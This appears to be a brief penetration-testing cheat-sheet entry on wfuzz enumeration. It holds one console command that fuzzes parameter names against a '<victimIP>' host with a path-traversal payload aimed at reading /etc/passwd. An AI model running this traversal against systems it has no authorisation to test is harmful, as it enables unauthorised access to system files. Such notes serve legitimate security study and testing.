wfuzz enum
****************

This can be used for finding resourced not linked to directories, servlets, scripts, etc.

URL file
##########

.. code-block:: console
       
   wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 80 --hc 404 http://<victimIP>/potential_malcious_page.php?FUZZ../../../../../../../../../../etc/passwd 
